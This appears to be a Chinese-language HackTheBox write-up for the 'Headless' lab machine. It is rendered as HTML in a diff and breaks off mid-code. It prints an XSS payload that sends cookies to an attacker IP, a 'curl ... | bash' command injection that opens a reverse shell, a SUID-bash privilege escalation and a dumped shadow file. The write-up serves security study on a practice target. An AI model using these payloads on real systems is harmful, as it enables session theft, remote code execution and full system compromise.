@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Headless真的很簡單，隨便寫寫算了，至少不會這麽懶。。。 Nmap1234567891011121314151617PORT     STATE SERVICE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Headless">
+<meta property="og:url" content="https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Headless真的很簡單，隨便寫寫算了，至少不會這麽懶。。。 Nmap1234567891011121314151617PORT     STATE SERVICE">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324194610-6dszk37.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183038-9y1faxc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183009-s6fv95p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183016-ua34kcl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183726-mzmogpb.png">
+<meta property="article:published_time" content="2024-03-24T13:00:11.000Z">
+<meta property="article:modified_time" content="2024-07-20T22:09:06.843Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324194610-6dszk37.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Headless</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/26/htb-fortresses/Aws/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/21/htb-fortresses/Faraday/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&text=HackTheBox - Machine - Headless"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&is_video=false&description=HackTheBox - Machine - Headless"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Headless&body=Check out this article: https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&name=HackTheBox - Machine - Headless&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&t=HackTheBox - Machine - Headless"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Headless
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-24T13:00:11.000Z" class="dt-published" itemprop="datePublished">2024-03-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Headless"><a href="#Headless" class="headerlink" title="Headless"></a>Headless</h1><p>真的很簡單，隨便寫寫算了，至少不會這麽懶。。。</p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 90:02:94:28:3d:ab:22:74:<span class="built_in">df</span>:0e:a3:b2:0f:2b:c6:17 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=</span><br><span class="line">|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW</span><br><span class="line"></span><br><span class="line">5000/tcp open  upnp?   syn-ack ttl 63</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.2.2 Python/3.11.2</span><br><span class="line">|     Date: Sun, 24 Mar 2024 09:49:51 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 2799</span><br><span class="line">|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/</span><br></pre></td></tr></table></figure>
+
+<p>就一個 python 服務器</p>
+<h2 id="80-web"><a href="#80-web" class="headerlink" title="80 - web"></a>80 - web</h2><p>隨便輸入一些東西，比如xss，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324194610-6dszk37.png" alt="image">​</p>
+<p>然後輸出</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183038-9y1faxc.png" alt="image">​</p>
+<p>他在隱約的告訴你，管理員會看到哦，既然提示管理員會看到，倒不如在header上注入：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183009-s6fv95p.png" alt="image">​</p>
+<p>然後就和想象中的一樣：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183016-ua34kcl.png" alt="image">​</p>
+<p>既然成功xss，那也只能偷cookie了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /support HTTP/1.1</span><br><span class="line">Host: 10.129.217.49:5000</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 192</span><br><span class="line">Origin: http://10.129.217.49:5000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.129.217.49:5000/support</span><br><span class="line">Cookie: &lt;img src=x onerror=<span class="string">&quot;fetch(&#x27;http://10.10.16.9/?&#x27; + btoa(document.cookie))&quot;</span> /&gt;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">fname=&lt;iframe+src%3dhttp%3a//10.10.16.9%3a8000/pwn+&lt;&amp;lname=&lt;iframe+src%3dhttp%3a//10.10.16.9%3a8000/pwn+&lt;&amp;email=sdad%40asda.aa&amp;phone=%&lt;iframe+src%3dhttp%3a//10.10.16.9%3a8000/pwn+&lt;&amp;message=&lt;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然後用偷到的cookie解下碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.129.217.49 - - [24/Mar/2024 18:35:17] <span class="string">&quot;GET /?aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>得到cookie，并且add 到瀏覽器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</span><br></pre></td></tr></table></figure>
+
+<p>大概如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-eUv3mTjvAILL6ud6-Headless/image-20240324183726-mzmogpb.png" alt="image">​</p>
+<p>試了很久， <code>&quot;</code>​ 和 <code>&#39;</code>​ 會不顯示東西，所以我就納悶了。不像是sql注入，更像是命令注入和LDAP注入。</p>
+<p>LDAP的話，輸入<code>**</code>​和 <code>*</code>​得到的結果是一樣的。。。所以就很懷疑是命令行注入。</p>
+<p>於是就暴力測試，然後： <code>date=1 ;curl 10.10.16.9/shell.sh | bash</code>​ 拿到了reverse shell。</p>
+<p>linpeas看看，看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">???????????? Checking <span class="string">&#x27;sudo -l&#x27;</span>, /etc/sudoers, and /etc/sudoers.d                                                                                                                         </span><br><span class="line">? https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="comment">#sudo-and-suid                                                                                                          </span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> dvir on headless:                                                                                                                                           </span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line">                                                                                                                                                                                          </span><br><span class="line">User dvir may run the following commands on headless:                                                                                                                                     </span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/syscheck                       </span><br></pre></td></tr></table></figure>
+
+<p>看了一下這個命令是一個脚本，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">dvir@headless:~$ whereis syscheck</span><br><span class="line">syscheck: /usr/bin/syscheck</span><br><span class="line"></span><br><span class="line">dvir@headless:~$ file /usr/bin/syscheck</span><br><span class="line">/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable</span><br><span class="line"></span><br><span class="line">dvir@headless:~$ <span class="built_in">cat</span> /usr/bin/syscheck</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name <span class="string">&#x27;vmlinuz*&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">stat</span> -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d <span class="string">&quot;@<span class="variable">$last_modified_time</span>&quot;</span> +<span class="string">&quot;%d/%m/%Y %H:%M&quot;</span>)</span><br><span class="line">/usr/bin/echo <span class="string">&quot;Last Kernel Modification Time: <span class="variable">$formatted_time</span>&quot;</span></span><br><span class="line"></span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk <span class="string">&#x27;NR==2 &#123;print $4&#125;&#x27;</span>)</span><br><span class="line">/usr/bin/echo <span class="string">&quot;Available disk space: <span class="variable">$disk_space</span>&quot;</span></span><br><span class="line"></span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F<span class="string">&#x27;load average:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">/usr/bin/echo <span class="string">&quot;System load average: <span class="variable">$load_average</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! /usr/bin/pgrep -x <span class="string">&quot;initdb.sh&quot;</span> &amp;&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;Database service is not running. Starting it...&quot;</span></span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;Database service is running.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">dvir@headless:~$ </span><br></pre></td></tr></table></figure>
+
+<p>看到了 <code>./initdb.sh</code>​ 隨手就寫了一個 initdb.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dvir@headless:~$ <span class="built_in">cat</span> initdb.sh </span><br><span class="line"><span class="comment">#! /bin/bash</span></span><br><span class="line"><span class="built_in">chmod</span> 4777 /bin/bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mane PWN&quot;</span></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<p>然後就root了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dvir@headless:~$ sudo syscheck</span><br><span class="line">Last Kernel Modification Time: 01/02/2024 10:05</span><br><span class="line">Available disk space: 1.9G</span><br><span class="line">System load average:  0.00, 0.01, 0.03</span><br><span class="line">Database service is not running. Starting it...</span><br><span class="line">mane PWN</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>隨便寫寫，由於沒什麽技術。</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$2cy/WxPggISXkBDRmZbL10$0w8yfYfo92xIpj.Qu7zcpzqjLInUcI26SaM2l0IRS.7:19737:0:99999:7:::</span><br><span class="line">daemon:*:19609:0:99999:7:::</span><br><span class="line">bin:*:19609:0:99999:7:::</span><br><span class="line">sys:*:19609:0:99999:7:::</span><br><span class="line">sync:*:19609:0:99999:7:::</span><br><span class="line">games:*:19609:0:99999:7:::</span><br><span class="line">man:*:19609:0:99999:7:::</span><br><span class="line">lp:*:19609:0:99999:7:::</span><br><span class="line">mail:*:19609:0:99999:7:::</span><br><span class="line">news:*:19609:0:99999:7:::</span><br><span class="line">uucp:*:19609:0:99999:7:::</span><br><span class="line">proxy:*:19609:0:99999:7:::</span><br><span class="line">www-data:*:19609:0:99999:7:::</span><br><span class="line">backup:*:19609:0:99999:7:::</span><br><span class="line">list:*:19609:0:99999:7:::</span><br><span class="line">irc:*:19609:0:99999:7:::</span><br><span class="line">_apt:*:19609:0:99999:7:::</span><br><span class="line">nobody:*:19609:0:99999:7:::</span><br><span class="line">systemd-network:!*:19609::::::</span><br><span class="line">tss:!:19609::::::</span><br><span class="line">systemd-timesync:!*:19609::::::</span><br><span class="line">messagebus:!:19609::::::</span><br><span class="line">usbmux:!:19609::::::</span><br><span class="line">dnsmasq:!:19609::::::</span><br><span class="line">avahi:!:19609::::::</span><br><span class="line">speech-dispatcher:!:19609::::::</span><br><span class="line">fwupd-refresh:!:19609::::::</span><br><span class="line">saned:!:19609::::::</span><br><span class="line">geoclue:!:19609::::::</span><br><span class="line">polkitd:!*:19609::::::</span><br><span class="line">rtkit:!:19609::::::</span><br><span class="line">colord:!:19609::::::</span><br><span class="line">dvir:$y$j9T$IKU310jZ./br3hMhSpYSH0$IbCr4LIWNnOd76D2ObQYiNOCmGX4ZI7DTnKjbs8gXe9:19610:0:99999:7:::</span><br><span class="line">sshd:!:19610::::::</span><br><span class="line">_laurel:!:19769::::::</span><br></pre></td></tr></table></figure>
+
+<h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])                                         </span><br><span class="line">def admin():                               </span><br><span class="line">    <span class="keyword">if</span> serializer.loads(request.cookies.get(<span class="string">&#x27;is_admin&#x27;</span>)) == <span class="string">&quot;user&quot;</span>:                       </span><br><span class="line">        <span class="built_in">return</span> abort(401)                                                                 </span><br><span class="line"></span><br><span class="line">    script_output = <span class="string">&quot;&quot;</span>                                                                    </span><br><span class="line">                                                                                                                                                                                        </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:           </span><br><span class="line">        <span class="built_in">date</span> = request.form.get(<span class="string">&#x27;date&#x27;</span>)                                                   </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">date</span>:                                                                          </span><br><span class="line">            script_output = os.popen(f<span class="string">&#x27;bash report.sh &#123;date&#125;&#x27;</span>).<span class="built_in">read</span>()                     </span><br><span class="line">                                           </span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, script_output=script_output)        </span><br></pre></td></tr></table></figure>
+
+<p>你可以看到他就是一個簡單的命令執行。</p>
+<p>然後前面的waf我也想到了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/support&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])                                             </span><br><span class="line">def support():                                                                              </span><br><span class="line">    <span 